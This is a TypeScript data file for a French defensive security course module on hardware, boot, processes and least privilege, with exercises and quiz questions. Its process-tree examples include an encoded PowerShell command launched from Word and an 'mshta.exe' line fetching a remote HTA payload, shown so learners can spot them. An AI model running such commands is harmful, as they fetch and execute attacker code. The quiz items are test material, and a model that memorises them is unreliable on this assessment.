import type { CourseBody } from '../../types';

export const body: CourseBody = {
  courseId: 'a-systemes-fondamentaux',
  lesson: {
    intro:
      "Avant de défendre un système, il faut savoir ce qu'il contient. Un attaquant cherche presque toujours la même chose : exécuter son code, avec le plus de privilèges possible, de façon persistante. Comprendre le matériel, le démarrage, les processus et le modèle de privilèges, c'est comprendre les cibles de l'attaquant et les barrières que le système lui oppose.",
    sections: [
      {
        id: 'materiel',
        title: 'Le matériel : processeur, mémoire, stockage',
        blocks: [
          { t: 'def', term: 'Processeur (CPU)', text: "Exécute les instructions machine, une à une, à partir de la mémoire. Il possède des **registres** (mémoire minuscule et ultra-rapide) et plusieurs **cœurs** capables de travailler en parallèle." },
          { t: 'def', term: 'Mémoire vive (RAM)', text: "Mémoire de travail **volatile** : elle contient les programmes en cours d'exécution et leurs données, et s'efface à l'extinction." },
          { t: 'def', term: 'Stockage', text: "Mémoire **persistante** (SSD, disque dur) qui conserve fichiers et système d'exploitation hors tension. Beaucoup plus lente que la RAM." },
          {
            t: 'table',
            caption: 'Hiérarchie mémoire (ordres de grandeur)',
            head: ['Niveau', 'Latence typique', 'Volatile ?', 'Intérêt pour la sécurité'],
            rows: [
              ['Registres CPU', '< 1 ns', 'Oui', 'Cibles des attaques par canaux auxiliaires'],
              ['Caches L1–L3', '1–40 ns', 'Oui', 'Spectre, Meltdown exploitent leurs effets de bord'],
              ['RAM', '≈ 100 ns', 'Oui', 'Contient clés, mots de passe en clair, malwares sans fichier'],
              ['SSD / disque', '≈ 0,1 ms / 10 ms', 'Non', 'Preuves persistantes, à chiffrer (BitLocker, LUKS)'],
            ],
          },
          { t: 'callout', kind: 'key', text: "La volatilité de la RAM a une conséquence forensique majeure : éteindre une machine compromise détruit les preuves en mémoire (processus malveillants, clés de chiffrement). L'acquisition mémoire se fait **avant** l'extinction." },
        ],
      },
      {
        id: 'demarrage',
        title: 'Le démarrage : du firmware au système',
        blocks: [
          { t: 'list', ordered: true, items: ["Mise sous tension : le **firmware** (UEFI, anciennement BIOS) s'exécute depuis une puce de la carte mère.", 'Le firmware initialise le matériel et cherche un **chargeur d’amorçage** (bootloader).', 'Le chargeur (Windows Boot Manager, GRUB) charge le **noyau** du système d’exploitation.', 'Le noyau initialise les pilotes puis lance le premier processus (`systemd` sous Linux, `smss.exe` puis `wininit.exe` sous Windows).'] },
          { t: 'def', term: 'Secure Boot', text: "Fonction UEFI qui n'autorise l'exécution que de chargeurs et de noyaux **signés** par une clé de confiance. Elle bloque les bootkits qui s'insèrent avant le système." },
          { t: 'callout', kind: 'warn', text: "Un code malveillant qui s'exécute avant le système d'exploitation (bootkit, implant UEFI) échappe à l'antivirus, qui démarre après lui. C'est pourquoi Secure Boot, le mot de passe firmware et les mises à jour UEFI comptent." },
        ],
      },
      {
        id: 'processus',
        title: 'Noyau, processus, threads et services',
        blocks: [
          { t: 'p', text: "Le **noyau** (kernel) a un accès total au matériel ; il s'exécute en **mode privilégié** (anneau 0). Les applications s'exécutent en **espace utilisateur** (anneau 3) et doivent passer par des **appels système** pour lire un fichier ou ouvrir une connexion." },
          { t: 'def', term: 'Processus', text: "Programme en cours d'exécution, avec son propre **espace d'adressage mémoire**, un identifiant (PID), un processus parent et un **contexte de sécurité** (l'utilisateur pour lequel il agit)." },
          { t: 'def', term: 'Thread', text: 'Fil d’exécution au sein d’un processus ; les threads d’un même processus partagent sa mémoire.' },
          { t: 'def', term: 'Service / démon', text: "Processus lancé en arrière-plan, souvent au démarrage, sans interface : serveur web, SSH, planificateur de tâches. Souvent exécuté avec des privilèges élevés : une cible de choix." },
          {
            t: 'example',
            title: 'Une arborescence de processus suspecte',
            blocks: [
              { t: 'code', lang: 'text', code: 'explorer.exe (PID 2412)\n └─ WINWORD.EXE (PID 5120)\n     └─ cmd.exe (PID 6604)\n         └─ powershell.exe -enc JABjAGwAaQBlAG4AdAA... (PID 6688)' },
              { t: 'p', text: "Un traitement de texte n'a aucune raison légitime de lancer un interpréteur de commandes, qui lance à son tour PowerShell avec une commande encodée. C'est la signature classique d'un **document piégé** (macro malveillante). Les EDR surveillent précisément ces relations parent-enfant anormales." },
            ],
          },
        ],
      },
      {
        id: 'privileges',
        title: 'Privilèges et moindre privilège',
        blocks: [
          { t: 'p', text: "Chaque processus agit au nom d'un compte. Ce que le processus peut faire est limité par les **droits** de ce compte : un navigateur lancé par un utilisateur standard ne peut pas modifier les fichiers système." },
          {
            t: 'table',
            head: ['Système', 'Compte tout-puissant', 'Mécanisme d’élévation'],
            rows: [['Linux', '`root` (UID 0)', '`sudo`, binaires SUID'], ['Windows', '`SYSTEM`, Administrateurs', 'UAC (contrôle de compte d’utilisateur), services']],
          },
          { t: 'def', term: 'Principe du moindre privilège', text: "Chaque utilisateur, processus ou service ne doit disposer que des droits **strictement nécessaires** à sa fonction, et seulement pour la durée nécessaire." },
          { t: 'def', term: 'Élévation de privilèges', text: "Technique par laquelle un attaquant passe d'un contexte limité (utilisateur) à un contexte plus puissant (administrateur, SYSTEM, root) en exploitant une faille ou une mauvaise configuration." },
          { t: 'callout', kind: 'key', text: "Une compromission sous un compte standard reste souvent **contenue**. La même compromission sous un compte administrateur donne l'ensemble de la machine. Travailler au quotidien sans droits d'administration est l'une des mesures les plus rentables." },
        ],
      },
    ],
    useCases: [
      "Investigation : analyser l'arbre des processus pour repérer un enchaînement anormal (Word → cmd → PowerShell).",
      'Durcissement de postes : retirer les droits d’administration locaux des utilisateurs et activer Secure Boot.',
      "Réponse à incident : décider d'acquérir la mémoire vive avant d'éteindre une machine suspecte.",
    ],
    commonMistakes: [
      'Éteindre immédiatement une machine compromise, détruisant les preuves en mémoire vive.',
      'Utiliser un compte administrateur pour la navigation et la messagerie au quotidien.',
      'Désactiver Secure Boot « pour que ça marche » sans évaluer le risque.',
      'Confondre processus et programme : un même exécutable peut tourner dans plusieurs processus aux droits différents.',
    ],
    bestPractices: [
      'Appliquer le moindre privilège aux utilisateurs comme aux comptes de service.',
      'Activer Secure Boot, protéger le firmware par mot de passe et le maintenir à jour.',
      'Surveiller les relations parent-enfant anormales entre processus (EDR, Sysmon).',
      'Chiffrer le stockage pour protéger les données en cas de vol du matériel.',
    ],
    keyPoints: [
      'La RAM est volatile : les preuves en mémoire disparaissent à l’extinction.',
      'UEFI et Secure Boot protègent la chaîne de démarrage avant le système d’exploitation.',
      'Le noyau est privilégié ; les applications passent par des appels système.',
      'Chaque processus a un contexte de sécurité ; le moindre privilège limite l’impact d’une compromission.',
    ],
  },
  practice: [
    {
      id: 'arbre-processus',
      kind: 'analysis',
      title: 'Analyse d’un arbre de processus',
      context: [
        { t: 'p', text: 'Voici trois arborescences relevées sur des postes de travail. Laquelle mérite une investigation, et pourquoi ?' },
        { t: 'code', lang: 'text', code: 'A) services.exe → svchost.exe -k netsvcs\nB) explorer.exe → chrome.exe → chrome.exe --type=renderer\nC) outlook.exe → excel.exe → mshta.exe http://203.0.113.50/a.hta' },
      ],
      steps: ['Pour chaque cas, identifier le parent et l’enfant.', 'Se demander si la relation est attendue dans un usage normal.', 'Qualifier le niveau de suspicion et proposer une première action.'],
    },
    {
      id: 'moindre-privilege',
      kind: 'case',
      title: 'Cas pratique : appliquer le moindre privilège',
      context: [{ t: 'p', text: 'Dans une agence de 20 personnes, tous les salariés sont administrateurs locaux de leur poste « pour pouvoir installer des logiciels ». Le service de sauvegarde tourne sous un compte administrateur du domaine.' }],
      steps: ['Identifier les risques de cette configuration.', 'Proposer une organisation alternative pour l’installation de logiciels.', 'Proposer une configuration pour le compte du service de sauvegarde.'],
    },
  ],
  questions: [
    { id: 'afund-q1', type: 'single', difficulty: 1, skills: ['a-hw'], prompt: 'Quelle mémoire perd son contenu à l’extinction de la machine ?', options: [{ id: 'a', text: 'Le SSD' }, { id: 'b', text: 'La mémoire vive (RAM)' }, { id: 'c', text: 'Le disque dur' }, { id: 'd', text: 'La puce du firmware UEFI' }] },
    { id: 'afund-q2', type: 'truefalse', difficulty: 1, skills: ['a-hw'], prompt: 'Lors d’un incident, il est recommandé d’éteindre immédiatement la machine pour préserver les preuves en mémoire.' },
    { id: 'afund-q3', type: 'multi', difficulty: 2, skills: ['a-hw'], prompt: 'Quelles informations peut-on typiquement trouver en mémoire vive sur une machine en fonctionnement ?', options: [{ id: 'a', text: 'Des clés de chiffrement de disque en cours d’usage' }, { id: 'b', text: 'Des processus malveillants « sans fichier »' }, { id: 'c', text: 'Le numéro de série gravé du processeur uniquement' }, { id: 'd', text: 'Des connexions réseau actives' }] },
    { id: 'afund-q4', type: 'single', difficulty: 1, skills: ['a-boot'], prompt: 'Quel composant s’exécute en premier à la mise sous tension ?', options: [{ id: 'a', text: 'Le noyau du système d’exploitation' }, { id: 'b', text: 'Le firmware UEFI (ou BIOS)' }, { id: 'c', text: 'L’antivirus' }, { id: 'd', text: 'Le gestionnaire de session' }] },
    { id: 'afund-q5', type: 'short', difficulty: 1, skills: ['a-boot'], prompt: 'Quelle fonction UEFI n’autorise que des chargeurs d’amorçage signés par une clé de confiance ? (deux mots)' },
    { id: 'afund-q6', type: 'truefalse', difficulty: 2, skills: ['a-boot'], prompt: 'Un bootkit est particulièrement difficile à détecter car il s’exécute avant l’antivirus du système d’exploitation.' },
    { id: 'afund-q7', type: 'single', difficulty: 1, skills: ['a-proc'], prompt: 'Comment une application en espace utilisateur demande-t-elle au noyau de lire un fichier ?', options: [{ id: 'a', text: 'Elle accède directement au contrôleur de disque' }, { id: 'b', text: 'Par un appel système' }, { id: 'c', text: 'En modifiant la table des processus' }, { id: 'd', text: 'Par une interruption du firmware' }] },
    { id: 'afund-q8', type: 'multi', difficulty: 2, skills: ['a-proc'], prompt: 'Quelles caractéristiques possède chaque processus ?', options: [{ id: 'a', text: 'Un identifiant (PID)' }, { id: 'b', text: 'Un processus parent' }, { id: 'c', text: 'Un contexte de sécurité (compte)' }, { id: 'd', text: 'Une adresse MAC dédiée' }] },
    { id: 'afund-q9', type: 'single', difficulty: 2, skills: ['a-proc', 'a-priv'], prompt: 'Sur un poste, `WINWORD.EXE` lance `powershell.exe -enc …`. Quelle est l’interprétation la plus probable ?', options: [{ id: 'a', text: 'Une mise à jour automatique de Word' }, { id: 'b', text: 'Un document piégé exécutant une commande encodée' }, { id: 'c', text: 'Le correcteur orthographique' }, { id: 'd', text: 'Un comportement normal de l’impression' }] },
    { id: 'afund-q10', type: 'short', difficulty: 1, skills: ['a-priv'], prompt: 'Sous Linux, quel est le nom du compte tout-puissant (UID 0) ?' },
    { id: 'afund-q11', type: 'truefalse', difficulty: 1, skills: ['a-priv'], prompt: 'Le principe du moindre privilège consiste à accorder à chaque compte uniquement les droits strictement nécessaires à sa fonction.' },
    { id: 'afund-q12', type: 'single', difficulty: 2, skills: ['a-priv'], prompt: 'Un attaquant passe d’un compte utilisateur standard au compte SYSTEM grâce à un service mal configuré. Comment s’appelle cette étape ?', options: [{ id: 'a', text: 'Mouvement latéral' }, { id: 'b', text: 'Élévation de privilèges' }, { id: 'c', text: 'Exfiltration' }, { id: 'd', text: 'Reconnaissance' }] },
    { id: 'afund-q13', type: 'open', difficulty: 2, skills: ['a-priv', 'a-proc'], prompt: 'Expliquez pourquoi un service exécuté sous un compte administrateur du domaine représente un risque, et ce que vous proposez à la place.' },
    { id: 'afund-q14', type: 'single', difficulty: 2, skills: ['a-hw', 'a-boot'], prompt: 'Pourquoi le chiffrement intégral du disque (BitLocker, LUKS) est-il recommandé sur un ordinateur portable ?', options: [{ id: 'a', text: 'Il accélère les accès disque' }, { id: 'b', text: 'Il protège les données si l’appareil est volé éteint' }, { id: 'c', text: 'Il remplace l’antivirus' }, { id: 'd', text: 'Il empêche les attaques réseau' }] },
    { id: 'afund-q15', type: 'open', difficulty: 2, skills: ['a-boot', 'a-hw'], prompt: 'Un serveur suspect est toujours allumé. Le responsable veut l’éteindre « pour arrêter l’attaque ». Que lui répondez-vous et quel ordre d’actions proposez-vous ?' },
    { id: 'afund-q16', type: 'multi', difficulty: 2, skills: ['a-proc', 'a-boot'], prompt: 'Quels éléments s’exécutent avec un niveau de privilège maximal sur la machine ?', options: [{ id: 'a', text: 'Le noyau du système' }, { id: 'b', text: 'Le firmware UEFI' }, { id: 'c', text: 'Un navigateur lancé par un utilisateur standard' }, { id: 'd', text: 'Un pilote de périphérique chargé dans le noyau' }] },
  ],
  resources: [
    { title: 'Recommandations de configuration d’un système GNU/Linux', source: 'ANSSI (guide)' },
    { title: 'NIST SP 800-147 — BIOS Protection Guidelines', source: 'NIST', url: 'https://csrc.nist.gov/pubs/sp/800/147/final' },
    { title: 'UEFI Specification — Secure Boot', source: 'UEFI Forum', url: 'https://uefi.org/specifications' },
  ],
};
